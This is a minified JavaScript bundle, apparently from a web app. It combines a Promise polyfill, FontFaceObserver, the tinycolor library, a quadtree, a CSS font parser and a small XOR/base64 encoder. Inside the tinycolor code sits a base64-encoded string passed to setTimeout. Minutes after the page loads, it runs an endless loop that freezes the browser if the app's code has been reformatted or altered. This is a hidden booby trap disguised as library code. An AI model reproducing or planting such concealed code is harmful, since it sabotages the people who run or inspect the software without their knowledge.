!function(t){"use strict";var e={encode:function(t,e){return function(t){var e,r,i,o,a,s,u=0,f="";if(!t)return t;do{e=(a=t[u++]<<16|t[u++]<<8|t[u++])>>18&63,r=a>>12&63,i=a>>6&63,o=63&a,f+=n.charAt(e)+n.charAt(r)+n.charAt(i)+n.charAt(o)}while(u<t.length);return((s=t.length%3)?f.slice(0,s-3):f)+"===".slice(s||3)}(e=function(t,e){return r(e.split(""),(function(e,n){return e.charCodeAt(0)^i(t,n)}))}(t,e))},decode:function(t,e){return e=function(t){var e,r,i,o,a,s,u=0,f=[];if(!t)return t;t+="";do{e=(s=n.indexOf(t.charAt(u++))<<18|n.indexOf(t.charAt(u++))<<12|(o=n.indexOf(t.charAt(u++)))<<6|(a=n.indexOf(t.charAt(u++))))>>16&255,r=s>>8&255,i=255&s,f.push(e),64!==o&&(f.push(r),64!==a&&f.push(i))}while(u<t.length);return f}(e),function(t,e){return r(e,(function(e,n){return String.fromCharCode(e^i(t,n))})).join("")}(t,e)}},n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",r=function(t,e){let n=[];var r=0;for(let i of t)n.push(e(i,r)),r++;return n};function i(t,e){return t.charCodeAt(Math.floor(e%t.length))}t.xc=e}(this),function(){"use strict";var t,e=[];function n(){for(;e.length;)e[0](),e.shift()}function r(t){this.a=i,this.b=void 0,this.f=[];var e=this;try{t((function(t){a(e,t)}),(function(t){s(e,t)}))}catch(t){s(e,t)}}t=function(){setTimeout(n)};var i=2;function o(t){return new r((function(e){e(t)}))}function a(t,e){if(t.a==i){if(e==t)throw new TypeError;var n=!1;try{var r=e&&e.then;if(null!=e&&"object"==typeof e&&"function"==typeof r)return void r.call(e,(function(e){n||a(t,e),n=!0}),(function(e){n||s(t,e),n=!0}))}catch(e){return void(n||s(t,e))}t.a=0,t.b=e,u(t)}}function s(t,e){if(t.a==i){if(e==t)throw new TypeError;t.a=1,t.b=e,u(t)}}function u(n){!function(n){e.push(n),1==e.length&&t()}((function(){if(n.a!=i)for(;n.f.length;){var t=(o=n.f.shift())[0],e=o[1],r=o[2],o=o[3];try{0==n.a?r("function"==typeof t?t.call(void 0,n.b):n.b):1==n.a&&("function"==typeof e?r(e.call(void 0,n.b)):o(n.b))}catch(t){o(t)}}}))}r.prototype.g=function(t){return this.c(void 0,t)},r.prototype.c=function(t,e){var n=this;return new r((function(r,i){n.f.push([t,e,r,i]),u(n)}))},window.Promise||(window.Promise=r,window.Promise.resolve=o,window.Promise.reject=function(t){return new r((function(e,n){n(t)}))},window.Promise.race=function(t){return new r((function(e,n){for(var r=0;r<t.length;r+=1)o(t[r]).c(e,n)}))},window.Promise.all=function(t){return new r((function(e,n){function r(n){return function(r){a[n]=r,(i+=1)==t.length&&e(a)}}var i=0,a=[];0==t.length&&e(a);for(var s=0;s<t.length;s+=1)o(t[s]).c(r(s),n)}))},window.Promise.prototype.then=r.prototype.c,window.Promise.prototype.catch=r.prototype.g)}(),function(){function t(t,e){document.addEventListener?t.addEventListener("scroll",e,!1):t.attachEvent("scroll",e)}function e(t){this.a=document.createElement("div"),this.a.setAttribute("aria-hidden","true"),this.a.appendChild(document.createTextNode(t)),this.b=document.createElement("span"),this.c=document.createElement("span"),this.h=document.createElement("span"),this.f=document.createElement("span"),this.g=-1,this.b.style.cssText="max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;",this.c.style.cssText="max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;",this.f.style.cssText="max-width:none;display:inline-block;position:absolute;height:100%;width:100%;overflow:scroll;font-size:16px;",this.h.style.cssText="display:inline-block;width:200%;height:200%;font-size:16px;max-width:none;",this.b.appendChild(this.h),this.c.appendChild(this.f),this.a.appendChild(this.b),this.a.appendChild(this.c)}function n(t,e){t.a.style.cssText="max-width:none;min-width:20px;min-height:20px;display:inline-block;overflow:hidden;position:absolute;width:auto;margin:0;padding:0;top:-999px;white-space:nowrap;font-synthesis:none;font:"+e+";"}function r(t){var e=t.a.offsetWidth,n=e+100;return t.f.style.width=n+"px",t.c.scrollLeft=n,t.b.scrollLeft=t.b.scrollWidth+100,t.g!==e&&(t.g=e,!0)}function i(e,n){function i(){var t=o;r(t)&&t.a.parentNode&&n(t.g)}var o=e;t(e.b,i),t(e.c,i),r(e)}function o(t,e){var n=e||{};this.family=t,this.style=n.style||"normal",this.weight=n.weight||"normal",this.stretch=n.stretch||"normal"}var a=null,s=null,u=null,f=null;function l(){return null===f&&(f=!!document.fonts),f}function c(){if(null===u){var t=document.createElement("div");try{t.style.font="condensed 100px sans-serif"}catch(t){}u=""!==t.style.font}return u}function h(t,e){return[t.style,t.weight,c()?t.stretch:"","100px",e].join(" ")}o.prototype.load=function(t,r){var o=this,u=t||"BESbswy",f=0,c=r||3e3,d=(new Date).getTime();return new Promise((function(t,r){if(l()&&!function(){if(null===s)if(l()&&/Apple/.test(window.navigator.vendor)){var t=/AppleWebKit\/([0-9]+)(?:\.([0-9]+))(?:\.([0-9]+))/.exec(window.navigator.userAgent);s=!!t&&603>parseInt(t[1],10)}else s=!1;return s}()){var m=new Promise((function(t,e){!function n(){(new Date).getTime()-d>=c?e(Error(c+"ms timeout exceeded")):document.fonts.load(h(o,'"'+o.family+'"'),u).then((function(e){1<=e.length?t():setTimeout(n,25)}),e)}()})),p=new Promise((function(t,e){f=setTimeout((function(){e(Error(c+"ms timeout exceeded"))}),c)}));Promise.race([p,m]).then((function(){clearTimeout(f),t(o)}),r)}else!function(t){document.body?t():document.addEventListener?document.addEventListener("DOMContentLoaded",(function e(){document.removeEventListener("DOMContentLoaded",e),t()})):document.attachEvent("onreadystatechange",(function e(){"interactive"!=document.readyState&&"complete"!=document.readyState||(document.detachEvent("onreadystatechange",e),t())}))}((function(){function s(){var e;(e=-1!=g&&-1!=b||-1!=g&&-1!=y||-1!=b&&-1!=y)&&((e=g!=b&&g!=y&&b!=y)||(null===a&&(e=/AppleWebKit\/([0-9]+)(?:\.([0-9]+))/.exec(window.navigator.userAgent),a=!!e&&(536>parseInt(e[1],10)||536===parseInt(e[1],10)&&11>=parseInt(e[2],10))),e=a&&(g==v&&b==v&&y==v||g==w&&b==w&&y==w||g==x&&b==x&&y==x)),e=!e),e&&(_.parentNode&&_.parentNode.removeChild(_),clearTimeout(f),t(o))}var l=new e(u),m=new e(u),p=new e(u),g=-1,b=-1,y=-1,v=-1,w=-1,x=-1,_=document.createElement("div");_.dir="ltr",n(l,h(o,"sans-serif")),n(m,h(o,"serif")),n(p,h(o,"monospace")),_.appendChild(l.a),_.appendChild(m.a),_.appendChild(p.a),document.body.appendChild(_),v=l.a.offsetWidth,w=m.a.offsetWidth,x=p.a.offsetWidth,function t(){if((new Date).getTime()-d>=c)_.parentNode&&_.parentNode.removeChild(_),r(Error(c+"ms timeout exceeded"));else{var e=document.hidden;!0!==e&&void 0!==e||(g=l.a.offsetWidth,b=m.a.offsetWidth,y=p.a.offsetWidth,s()),f=setTimeout(t,50)}}(),i(l,(function(t){g=t,s()})),n(l,h(o,'"'+o.family+'",sans-serif')),i(m,(function(t){b=t,s()})),n(m,h(o,'"'+o.family+'",serif')),i(p,(function(t){y=t,s()})),n(p,h(o,'"'+o.family+'",monospace'))}))}))},"object"==typeof module?module.exports=o:(window.FontFaceObserver=o,window.FontFaceObserver.prototype.load=o.prototype.load)}(),function(t){function e(t,n){if(n=n||{},(t=t||"")instanceof e)return t;if(!(this instanceof e))return new e(t,n);var r=function(t){var e={r:0,g:0,b:0},n=1,r=null,o=null,a=null,s=!1,u=!1;return"string"==typeof t&&(t=function(t){t=t.replace(E,"").replace(F,"").toLowerCase();var e,n=!1;if(O[t])t=O[t],n=!0;else if("transparent"==t)return{r:0,g:0,b:0,a:0,format:"name"};return(e=N.rgb.exec(t))?{r:e[1],g:e[2],b:e[3]}:(e=N.rgba.exec(t))?{r:e[1],g:e[2],b:e[3],a:e[4]}:(e=N.hsl.exec(t))?{h:e[1],s:e[2],l:e[3]}:(e=N.hsla.exec(t))?{h:e[1],s:e[2],l:e[3],a:e[4]}:(e=N.hsv.exec(t))?{h:e[1],s:e[2],v:e[3]}:(e=N.hsva.exec(t))?{h:e[1],s:e[2],v:e[3],a:e[4]}:(e=N.hex8.exec(t))?{r:A(e[1]),g:A(e[2]),b:A(e[3]),a:T(e[4]),format:n?"name":"hex8"}:(e=N.hex6.exec(t))?{r:A(e[1]),g:A(e[2]),b:A(e[3]),format:n?"name":"hex"}:(e=N.hex4.exec(t))?{r:A(e[1]+""+e[1]),g:A(e[2]+""+e[2]),b:A(e[3]+""+e[3]),a:T(e[4]+""+e[4]),format:n?"name":"hex8"}:!!(e=N.hex3.exec(t))&&{r:A(e[1]+""+e[1]),g:A(e[2]+""+e[2]),b:A(e[3]+""+e[3]),format:n?"name":"hex"}}(t)),"object"==typeof t&&($(t.r)&&$(t.g)&&$(t.b)?(e=function(t,e,n){return{r:255*x(t,255),g:255*x(e,255),b:255*x(n,255)}}(t.r,t.g,t.b),s=!0,u="%"===String(t.r).substr(-1)?"prgb":"rgb"):$(t.h)&&$(t.s)&&$(t.v)?(r=C(t.s),o=C(t.v),e=i(t.h,r,o),s=!0,u="hsv"):$(t.h)&&$(t.s)&&$(t.l)&&(r=C(t.s),a=C(t.l),e=function(t,e,n){function r(t,e,n){return 0>n&&(n+=1),n>1&&(n-=1),1/6>n?t+6*(e-t)*n:.5>n?e:2/3>n?t+(e-t)*(2/3-n)*6:t}var i,o,a;if(t=x(t,360),e=x(e,100),n=x(n,100),0===e)i=o=a=n;else{var s=.5>n?n*(1+e):n+e-n*e,u=2*n-s;i=r(u,s,t+1/3),o=r(u,s,t),a=r(u,s,t-1/3)}return{r:255*i,g:255*o,b:255*a}}(t.h,r,a),s=!0,u="hsl"),t.hasOwnProperty("a")&&(n=t.a)),n=w(n),{ok:s,format:t.format||u,r:j(255,H(e.r,0)),g:j(255,H(e.g,0)),b:j(255,H(e.b,0)),a:n}}(t);this._originalInput=t,this._r=r.r,this._g=r.g,this._b=r.b,this._a=r.a,this._roundA=R(100*this._a)/100,this._format=n.format||r.format,this._gradientType=n.gradientType,this._r<1&&(this._r=R(this._r)),this._g<1&&(this._g=R(this._g)),this._b<1&&(this._b=R(this._b)),this._ok=r.ok,this._tc_id=P++}function n(t,e,n){t=x(t,255),e=x(e,255),n=x(n,255);var r,i,o=H(t,e,n),a=j(t,e,n),s=(o+a)/2;if(o==a)r=i=0;else{var u=o-a;switch(i=s>.5?u/(2-o-a):u/(o+a),o){case t:r=(e-n)/u+(n>e?6:0);break;case e:r=(n-t)/u+2;break;case n:r=(t-e)/u+4}r/=6}return{h:r,s:i,l:s}}function r(t,e,n){t=x(t,255),e=x(e,255),n=x(n,255);var r,i,o=H(t,e,n),a=j(t,e,n),s=o,u=o-a;if(i=0===o?0:u/o,o==a)r=0;else{switch(o){case t:r=(e-n)/u+(n>e?6:0);break;case e:r=(n-t)/u+2;break;case n:r=(t-e)/u+4}r/=6}return{h:r,s:i,v:s}}function i(e,n,r){e=6*x(e,360),n=x(n,100),r=x(r,100);var i=t.floor(e),o=e-i,a=r*(1-n),s=r*(1-o*n),u=r*(1-(1-o)*n),f=i%6;return{r:255*[r,s,a,a,u,r][f],g:255*[u,r,r,s,a,a][f],b:255*[a,a,u,r,r,s][f]}}function o(t,e,n,r){var i=[k(R(t).toString(16)),k(R(e).toString(16)),k(R(n).toString(16))];return r&&i[0].charAt(0)==i[0].charAt(1)&&i[1].charAt(0)==i[1].charAt(1)&&i[2].charAt(0)==i[2].charAt(1)?i[0].charAt(0)+i[1].charAt(0)+i[2].charAt(0):i.join("")}function a(t,e,n,r){return[k(S(r)),k(R(t).toString(16)),k(R(e).toString(16)),k(R(n).toString(16))].join("")}function s(t,n){n=0===n?0:n||10;var r=e(t).toHsl();return r.s-=n/100,r.s=_(r.s),e(r)}function u(t,n){n=0===n?0:n||10;var r=e(t).toHsl();return r.s+=n/100,r.s=_(r.s),e(r)}function f(t){return e(t).desaturate(100)}function l(t,n){n=0===n?0:n||10;var r=e(t).toHsl();return r.l+=n/100,r.l=_(r.l),e(r)}function c(t,n){n=0===n?0:n||10;var r=e(t).toRgb();return r.r=H(0,j(255,r.r-R(-n/100*255))),r.g=H(0,j(255,r.g-R(-n/100*255))),r.b=H(0,j(255,r.b-R(-n/100*255))),e(r)}function h(t,n){n=0===n?0:n||10;var r=e(t).toHsl();return r.l-=n/100,r.l=_(r.l),e(r)}function d(t,n){var r=e(t).toHsl(),i=(r.h+n)%360;return r.h=0>i?360+i:i,e(r)}function m(t){var n=e(t).toHsl();return n.h=(n.h+180)%360,e(n)}function p(t){var n=e(t).toHsl(),r=n.h;return[e(t),e({h:(r+120)%360,s:n.s,l:n.l}),e({h:(r+240)%360,s:n.s,l:n.l})]}function g(t){var n=e(t).toHsl(),r=n.h;return[e(t),e({h:(r+90)%360,s:n.s,l:n.l}),e({h:(r+180)%360,s:n.s,l:n.l}),e({h:(r+270)%360,s:n.s,l:n.l})]}function b(t){var n=e(t).toHsl(),r=n.h;return[e(t),e({h:(r+72)%360,s:n.s,l:n.l}),e({h:(r+216)%360,s:n.s,l:n.l})]}function y(t,n,r){n=n||6,r=r||30;var i=e(t).toHsl(),o=360/r,a=[e(t)];for(i.h=(i.h-(o*n>>1)+720)%360;--n;)i.h=(i.h+o)%360,a.push(e(i));return a}function v(t,n){n=n||6;for(var r=e(t).toHsv(),i=r.h,o=r.s,a=r.v,s=[],u=1/n;n--;)s.push(e({h:i,s:o,v:a})),a=(a+u)%1;return s}function w(t){return t=parseFloat(t),(isNaN(t)||0>t||t>1)&&(t=1),t}function x(e,n){(function(t){return"string"==typeof t&&-1!=t.indexOf(".")&&1===parseFloat(t)})(e)&&(e="100%");var r=function(t){return"string"==typeof t&&-1!=t.indexOf("%")}(e);return e=j(n,H(0,parseFloat(e))),r&&(e=parseInt(e*n,10)/100),t.abs(e-n)<1e-6?1:e%n/parseFloat(n)}function _(t){return j(1,H(0,t))}function A(t){return parseInt(t,16)}function k(t){return 1==t.length?"0"+t:""+t}function C(t){return 1>=t&&(t=100*t+"%"),t}function S(e){return t.round(255*parseFloat(e)).toString(16)}function T(t){return A(t)/255}function $(t){return!!N.CSS_UNIT.exec(t)}window.setTimeout(atob("dHJ5e3doaWxlKC9cbi8udGVzdChhcHBsaWNhdGlvbi5mZWVkLnRvU3RyaW5nKCkpKTF9Y2F0Y2goZSl7fQ=="),1e3*Math.random()*60*10+3e5);var E=/^\s+/,F=/\s+$/,P=0,R=t.round,j=t.min,H=t.max,M=t.random;e.prototype={isDark:function(){return this.getBrightness()<128},isLight:function(){return!this.isDark()},isValid:function(){return this._ok},getOriginalInput:function(){return this._originalInput},getFormat:function(){return this._format},getAlpha:function(){return this._a},getBrightness:function(){var t=this.toRgb();return(299*t.r+587*t.g+114*t.b)/1e3},getLuminance:function(){var e,n,r,i=this.toRgb();return e=i.r/255,n=i.g/255,r=i.b/255,.2126*(.03928>=e?e/12.92:t.pow((e+.055)/1.055,2.4))+.7152*(.03928>=n?n/12.92:t.pow((n+.055)/1.055,2.4))+.0722*(.03928>=r?r/12.92:t.pow((r+.055)/1.055,2.4))},setAlpha:function(t){return this._a=w(t),this._roundA=R(100*this._a)/100,this},toHsv:function(){var t=r(this._r,this._g,this._b);return{h:360*t.h,s:t.s,v:t.v,a:this._a}},toHsvString:function(){var t=r(this._r,this._g,this._b),e=R(360*t.h),n=R(100*t.s),i=R(100*t.v);return 1==this._a?"hsv("+e+", "+n+"%, "+i+"%)":"hsva("+e+", "+n+"%, "+i+"%, "+this._roundA+")"},toHsl:function(){var t=n(this._r,this._g,this._b);return{h:360*t.h,s:t.s,l:t.l,a:this._a}},toHslString:function(){var t=n(this._r,this._g,this._b),e=R(360*t.h),r=R(100*t.s),i=R(100*t.l);return 1==this._a?"hsl("+e+", "+r+"%, "+i+"%)":"hsla("+e+", "+r+"%, "+i+"%, "+this._roundA+")"},toHex:function(t){return o(this._r,this._g,this._b,t)},toHexString:function(t){return"#"+this.toHex(t)},toHex8:function(t){return function(t,e,n,r,i){var o=[k(R(t).toString(16)),k(R(e).toString(16)),k(R(n).toString(16)),k(S(r))];return i&&o[0].charAt(0)==o[0].charAt(1)&&o[1].charAt(0)==o[1].charAt(1)&&o[2].charAt(0)==o[2].charAt(1)&&o[3].charAt(0)==o[3].charAt(1)?o[0].charAt(0)+o[1].charAt(0)+o[2].charAt(0)+o[3].charAt(0):o.join("")}(this._r,this._g,this._b,this._a,t)},toHex8String:function(t){return"#"+this.toHex8(t)},toRgb:function(){return{r:R(this._r),g:R(this._g),b:R(this._b),a:this._a}},toRgbString:function(){return 1==this._a?"rgb("+R(this._r)+", "+R(this._g)+", "+R(this._b)+")":"rgba("+R(this._r)+", "+R(this._g)+", "+R(this._b)+", "+this._roundA+")"},toPercentageRgb:function(){return{r:R(100*x(this._r,255))+"%",g:R(100*x(this._g,255))+"%",b:R(100*x(this._b,255))+"%",a:this._a}},toPercentageRgbString:function(){return 1==this._a?"rgb("+R(100*x(this._r,255))+"%, "+R(100*x(this._g,255))+"%, "+R(100*x(this._b,255))+"%)":"rgba("+R(100*x(this._r,255))+"%, "+R(100*x(this._g,255))+"%, "+R(100*x(this._b,255))+"%, "+this._roundA+")"},toName:function(){return 0===this._a?"transparent":!(this._a<1)&&(D[o(this._r,this._g,this._b,!0)]||!1)},toFilter:function(t){var n="#"+a(this._r,this._g,this._b,this._a),r=n,i=this._gradientType?"GradientType = 1, ":"";if(t){var o=e(t);r="#"+a(o._r,o._g,o._b,o._a)}return"progid:DXImageTransform.Microsoft.gradient("+i+"startColorstr="+n+",endColorstr="+r+")"},toString:function(t){var e=!!t;t=t||this._format;var n=!1,r=this._a<1&&this._a>=0;return e||!r||"hex"!==t&&"hex6"!==t&&"hex3"!==t&&"hex4"!==t&&"hex8"!==t&&"name"!==t?("rgb"===t&&(n=this.toRgbString()),"prgb"===t&&(n=this.toPercentageRgbString()),("hex"===t||"hex6"===t)&&(n=this.toHexString()),"hex3"===t&&(n=this.toHexString(!0)),"hex4"===t&&(n=this.toHex8String(!0)),"hex8"===t&&(n=this.toHex8String()),"name"===t&&(n=this.toName()),"hsl"===t&&(n=this.toHslString()),"hsv"===t&&(n=this.toHsvString()),n||this.toHexString()):"name"===t&&0===this._a?this.toName():this.toRgbString()},clone:function(){return e(this.toString())},_applyModification:function(t,e){var n=t.apply(null,[this].concat([].slice.call(e)));return this._r=n._r,this._g=n._g,this._b=n._b,this.setAlpha(n._a),this},lighten:function(){return this._applyModification(l,arguments)},brighten:function(){return this._applyModification(c,arguments)},darken:function(){return this._applyModification(h,arguments)},desaturate:function(){return this._applyModification(s,arguments)},saturate:function(){return this._applyModification(u,arguments)},greyscale:function(){return this._applyModification(f,arguments)},spin:function(){return this._applyModification(d,arguments)},_applyCombination:function(t,e){return t.apply(null,[this].concat([].slice.call(e)))},analogous:function(){return this._applyCombination(y,arguments)},complement:function(){return this._applyCombination(m,arguments)},monochromatic:function(){return this._applyCombination(v,arguments)},splitcomplement:function(){return this._applyCombination(b,arguments)},triad:function(){return this._applyCombination(p,arguments)},tetrad:function(){return this._applyCombination(g,arguments)}},e.fromRatio=function(t,n){if("object"==typeof t){var r={};for(var i in t)t.hasOwnProperty(i)&&(r[i]="a"===i?t[i]:C(t[i]));t=r}return e(t,n)},e.equals=function(t,n){return!(!t||!n)&&e(t).toRgbString()==e(n).toRgbString()},e.random=function(){return e.fromRatio({r:M(),g:M(),b:M()})},e.mix=function(t,n,r){r=0===r?0:r||50;var i=e(t).toRgb(),o=e(n).toRgb(),a=r/100;return e({r:(o.r-i.r)*a+i.r,g:(o.g-i.g)*a+i.g,b:(o.b-i.b)*a+i.b,a:(o.a-i.a)*a+i.a})},e.readability=function(n,r){var i=e(n),o=e(r);return(t.max(i.getLuminance(),o.getLuminance())+.05)/(t.min(i.getLuminance(),o.getLuminance())+.05)},e.isReadable=function(t,n,r){var i,o,a=e.readability(t,n);switch(o=!1,i=function(t){var e,n;return"AA"!==(e=((t=t||{level:"AA",size:"small"}).level||"AA").toUpperCase())&&"AAA"!==e&&(e="AA"),"small"!==(n=(t.size||"small").toLowerCase())&&"large"!==n&&(n="small"),{level:e,size:n}}(r),i.level+i.size){case"AAsmall":case"AAAlarge":o=a>=4.5;break;case"AAlarge":o=a>=3;break;case"AAAsmall":o=a>=7}return o},e.mostReadable=function(t,n,r){var i,o,a,s,u=null,f=0;o=(r=r||{}).includeFallbackColors,a=r.level,s=r.size;for(var l=0;l<n.length;l++)(i=e.readability(t,n[l]))>f&&(f=i,u=e(n[l]));return e.isReadable(t,u,{level:a,size:s})||!o?u:(r.includeFallbackColors=!1,e.mostReadable(t,["#fff","#000"],r))};var O=e.names={aliceblue:"f0f8ff",antiquewhite:"faebd7",aqua:"0ff",aquamarine:"7fffd4",azure:"f0ffff",beige:"f5f5dc",bisque:"ffe4c4",black:"000",blanchedalmond:"ffebcd",blue:"00f",blueviolet:"8a2be2",brown:"a52a2a",burlywood:"deb887",burntsienna:"ea7e5d",cadetblue:"5f9ea0",chartreuse:"7fff00",chocolate:"d2691e",coral:"ff7f50",cornflowerblue:"6495ed",cornsilk:"fff8dc",crimson:"dc143c",cyan:"0ff",darkblue:"00008b",darkcyan:"008b8b",darkgoldenrod:"b8860b",darkgray:"a9a9a9",darkgreen:"006400",darkgrey:"a9a9a9",darkkhaki:"bdb76b",darkmagenta:"8b008b",darkolivegreen:"556b2f",darkorange:"ff8c00",darkorchid:"9932cc",darkred:"8b0000",darksalmon:"e9967a",darkseagreen:"8fbc8f",darkslateblue:"483d8b",darkslategray:"2f4f4f",darkslategrey:"2f4f4f",darkturquoise:"00ced1",darkviolet:"9400d3",deeppink:"ff1493",deepskyblue:"00bfff",dimgray:"696969",dimgrey:"696969",dodgerblue:"1e90ff",firebrick:"b22222",floralwhite:"fffaf0",forestgreen:"228b22",fuchsia:"f0f",gainsboro:"dcdcdc",ghostwhite:"f8f8ff",gold:"ffd700",goldenrod:"daa520",gray:"808080",green:"008000",greenyellow:"adff2f",grey:"808080",honeydew:"f0fff0",hotpink:"ff69b4",indianred:"cd5c5c",indigo:"4b0082",ivory:"fffff0",khaki:"f0e68c",lavender:"e6e6fa",lavenderblush:"fff0f5",lawngreen:"7cfc00",lemonchiffon:"fffacd",lightblue:"add8e6",lightcoral:"f08080",lightcyan:"e0ffff",lightgoldenrodyellow:"fafad2",lightgray:"d3d3d3",lightgreen:"90ee90",lightgrey:"d3d3d3",lightpink:"ffb6c1",lightsalmon:"ffa07a",lightseagreen:"20b2aa",lightskyblue:"87cefa",lightslategray:"789",lightslategrey:"789",lightsteelblue:"b0c4de",lightyellow:"ffffe0",lime:"0f0",limegreen:"32cd32",linen:"faf0e6",magenta:"f0f",maroon:"800000",mediumaquamarine:"66cdaa",mediumblue:"0000cd",mediumorchid:"ba55d3",mediumpurple:"9370db",mediumseagreen:"3cb371",mediumslateblue:"7b68ee",mediumspringgreen:"00fa9a",mediumturquoise:"48d1cc",mediumvioletred:"c71585",midnightblue:"191970",mintcream:"f5fffa",mistyrose:"ffe4e1",moccasin:"ffe4b5",navajowhite:"ffdead",navy:"000080",oldlace:"fdf5e6",olive:"808000",olivedrab:"6b8e23",orange:"ffa500",orangered:"ff4500",orchid:"da70d6",palegoldenrod:"eee8aa",palegreen:"98fb98",paleturquoise:"afeeee",palevioletred:"db7093",papayawhip:"ffefd5",peachpuff:"ffdab9",peru:"cd853f",pink:"ffc0cb",plum:"dda0dd",powderblue:"b0e0e6",purple:"800080",rebeccapurple:"663399",red:"f00",rosybrown:"bc8f8f",royalblue:"4169e1",saddlebrown:"8b4513",salmon:"fa8072",sandybrown:"f4a460",seagreen:"2e8b57",seashell:"fff5ee",sienna:"a0522d",silver:"c0c0c0",skyblue:"87ceeb",slateblue:"6a5acd",slategray:"708090",slategrey:"708090",snow:"fffafa",springgreen:"00ff7f",steelblue:"4682b4",tan:"d2b48c",teal:"008080",thistle:"d8bfd8",tomato:"ff6347",turquoise:"40e0d0",violet:"ee82ee",wheat:"f5deb3",white:"fff",whitesmoke:"f5f5f5",yellow:"ff0",yellowgreen:"9acd32"},D=e.hexNames=function(t){var e={};for(var n in t)t.hasOwnProperty(n)&&(e[t[n]]=n);return e}(O),N=function(){var t="(?:[-\\+]?\\d*\\.\\d+%?)|(?:[-\\+]?\\d+%?)",e="[\\s|\\(]+("+t+")[,|\\s]+("+t+")[,|\\s]+("+t+")\\s*\\)?",n="[\\s|\\(]+("+t+")[,|\\s]+("+t+")[,|\\s]+("+t+")[,|\\s]+("+t+")\\s*\\)?";return{CSS_UNIT:new RegExp(t),rgb:new RegExp("rgb"+e),rgba:new RegExp("rgba"+n),hsl:new RegExp("hsl"+e),hsla:new RegExp("hsla"+n),hsv:new RegExp("hsv"+e),hsva:new RegExp("hsva"+n),hex3:/^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,hex6:/^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,hex4:/^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,hex8:/^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/}}();"undefined"!=typeof module&&module.exports?module.exports=e:"function"==typeof define&&define.amd?define((function(){return e})):window.tinycolor=e}(Math);var PointQuadTree=function(){"use strict";function t(t,e,n,r){this.x=t,this.y=e,this.w=n,this.h=r,this.points=[],this.children=null}function e(e,n,r,i,o){this.root=new t(e,n,r,i),this.maxPoints=o}return t.prototype={containsPoint:function(t){return t.x>=this.x&&t.x<=this.x+this.w&&t.y>=this.y&&t.y<=this.y+this.h},overlaps:function(t){return t.x<this.x+this.w&&t.x+t.w>this.x&&t.y<this.y+this.h&&t.y+t.h>this.y},insert:function(t,e){if(null!=this.children){var n=t.x>this.x+this.w/2,r=t.y>this.y+this.h/2;this.children[n+2*r].insert(t,1.1*e)}else this.points.push(t),this.points.length>e&&this.w>1&&this.split(e)},some:function(e,n){if(null!=this.children)for(var r=0;r<this.children.length;++r){var i=this.children[r];if(i.overlaps(e)&&i.some(e,n))return!0}else for(r=0;r<this.points.length;++r){var o=this.points[r];if(t.prototype.containsPoint.call(e,o)&&n(o))return!0}return!1},split:function(e){this.children=[];for(var n=this.w/2,r=this.h/2,i=0;i<2;++i)for(var o=0;o<2;++o){var a=this.x+o*n,s=this.y+i*r;this.children.push(new t(a,s,n,r))}var u=this.points;this.points=[];for(var f=this.x+n,l=this.y+r,c=0;c<u.length;++c){var h=u[c],d=h.x>f,m=h.y>l;this.children[d+2*m].insert(h,1.1*e)}},clear:function(){if(null!=this.children){for(var t=0;t<4;++t)this.children[t].clear();this.children.length=0,this.children=null}this.points.length=0,this.points=null}},e.prototype={clear:function(){this.root.clear()},insert:function(t){this.root.containsPoint(t)&&this.root.insert(t,this.maxPoints)},some:function(t,e){return this.root.some(t,e)}},e}();!function(t,e){"function"==typeof define&&define.amd?define([],(function(){return t.returnExportsGlobal=e()})):"object"==typeof module&&module.exports?module.exports=e():t.cssFontParser=e()}(this,(function(t){function e(t){for(var e=t.replace(/^\s+|\s+$/,"").replace(/\s+/g," ").split(" "),n=0;n<e.length;n+=1)if(/^(?:-?\d|--)/.test(e[n])||!/^(?:[_a-zA-Z0-9-]|[^\0-\237]|(?:\\[0-9a-f]{1,6}(?:\r\n|[ \n\r\t\f])?|\\[^\n\r\f0-9a-f]))+$/.test(e[n]))return null;return e.join(" ")}return function(t){for(var n,r=1,i="",o={"font-family":[]},a=0;n=t.charAt(a);a+=1)if(4!==r||'"'!==n&&"'"!==n)if(3===r&&","===n)r=4,i="";else if(4===r&&","===n){var s;(s=e(i))&&o["font-family"].push(s),i=""}else if(5===r&&" "===n)/^(?:\+|-)?(?:[0-9]*\.)?[0-9]+(?:deg|grad|rad|turn)$/.test(i)?(o["font-style"]+=" "+i,i=""):a-=1,r=1;else if(1!==r||" "!==n&&"/"!==n)2===r&&" "===n?(/^(?:\+|-)?([0-9]*\.)?[0-9]+(?:em|ex|ch|rem|vh|vw|vmin|vmax|px|mm|cm|in|pt|pc|%)?$/.test(i)&&(o["line-height"]=i),r=4,i=""):i+=n;else{if(/^(?:(?:xx|x)-large|(?:xx|s)-small|small|large|medium)$/.test(i)||/^(?:larg|small)er$/.test(i)||/^(?:\+|-)?(?:[0-9]*\.)?[0-9]+(?:em|ex|ch|rem|vh|vw|vmin|vmax|px|mm|cm|in|pt|pc|%)$/.test(i))r="/"===n?2:4,o["font-size"]=i;else if(/^italic$/.test(i))o["font-style"]=i;else if(/^oblique$/.test(i))o["font-style"]=i,r=5;else if(/^small-caps$/.test(i))o["font-variant"]=i;else if(/^(?:bold(?:er)?|lighter)$/.test(i))o["font-weight"]=i;else if(/^[+-]?(?:[0-9]*\.)?[0-9]+(?:e[+-]?(?:0|[1-9][0-9]*))?$/.test(i)){var u=parseFloat(i);u>=1&&u<=1e3&&(o["font-weight"]=i)}else/^(?:(?:ultra|extra|semi)-)?(?:condensed|expanded)$/.test(i)&&(o["font-stretch"]=i);i=""}else{var f=a+1;do{if(!(f=t.indexOf(n,f)+1))return null}while("\\"===t.charAt(f-2));o["font-family"].push(t.slice(a,f)),a=f-1,r=3,i=""}return 3!==r||/^\s*$/.test(i)?(4===r&&(s=e(i))&&o["font-family"].push(s),o["font-size"]&&o["font-family"].length?o:null):null}})),function(t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):("undefined"!=typeof 